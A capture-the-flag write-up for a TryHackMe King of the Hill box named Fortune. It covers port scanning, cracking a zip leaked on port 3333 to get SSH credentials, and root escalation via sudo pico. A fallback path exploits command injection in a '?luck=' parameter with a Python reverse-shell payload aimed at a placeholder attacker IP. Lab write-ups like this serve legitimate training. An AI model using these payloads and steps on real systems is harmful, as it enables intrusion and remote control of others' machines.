# Fortune.THM - Koth 

<!---as KOTH is an intensive competition on flags and king declerations it is naturaly a good practice to scan a bunch of things at ones. some what of a fuzzing for entries... in real life this type of stratagy is very 'loud', so don't mimic anything from here this is not practical at all
--->
### enum
```bash
nmap fortune.thm -p- 
nmap fortune.thm -sV -sC 
nmap fortune.thm 
```
we got a lot of ports lets go for port 3333

### netcat
ill try to use netcat to see what's on the other side

nc fortune.thm 3333

I Got an encoded string... 
I pretty sure it's base64


```bash
nc fortune.thm 3333 | base64 -d
```

i get an output with a "magic byte" = PK
PK is the zip magic byte and every zip file is and shuld have PK at the start of the file.
In addition we can see a file name in the output called "creds.txt". this is defenetly a zip file...
lets save this output as a file

```bash
nc fortune.thm 3333 | base64 -d > test.zip
unzip test.zip 
Archive:  test.zip
[test.zip] creds.txt password: 
```

looks like this file has a password, john is my man for the job!

### Meet my friend John.
creat the john file format with zip2john and then send it to john
```bash
zip2john test.zip > hash.txt
john hash.txt
unzip test.zip

unzip test.zip 
Archive:  test.zip
[test.zip] creds.txt password: 
 extracting: creds.txt               
```

now that we have our password to the zip file we can unzip and see what contain the creds.txt file
```bash
cat creds.txt
```
we found a use named "fortuna" and his password "**********"

```bash
ssh fortuna@fortune.thm
password:
```

and we are in!
```bash
sudo -l
```
we can see that we are indeed in the sudoers file but we can only run pico as sudo
lets go to https://gtfobins.github.io/ to see what pico can do for us

so i got the shell type b 'exploit'

we run 
```bash
pico -s /bin/sh
```

we type in the text editor "/bin/sh"
and then we will ^T (CTRL + T) to execute out command

and it works just fine Although I think a stable shell can be helpful here and in KOTH in general look here to learn more "https://www.youtube.com/watch?v=f2aSXGbD0NE"


## method b if password has changed / we are no longer a sudo user

try to do somthing like

```bash
cd /home
while True; do bash ./lucky_shell
```

this binery is just an exploit on the system and we can run it until we get a root shell


If you are locked out from fortuna

### gobuster
```bash
gobuster dir -w ~/Desktop/wordlists/wordlistex2.txt -u http://fortune.thm
```
found _style and a message within saying something about the luck paramater... so i just gave it a luck paramater...

```html
fortune.thm/_style/?luck=ls
```
and sure enoght it works! well.. not on the first try
most of the time this will fail but in some cases the command will execute...
lets check if python is around

```html
fortune.thm/_style/?luck="python -c 'print(1)'"
```
and it is!

kali:
```bash
nc -nlvp 1234
```

payload:
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MYIP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

poc:
```html
http://fortune.thm/_styles/?luck=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22MYIP%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

we got a shell!
and the rest is the same.
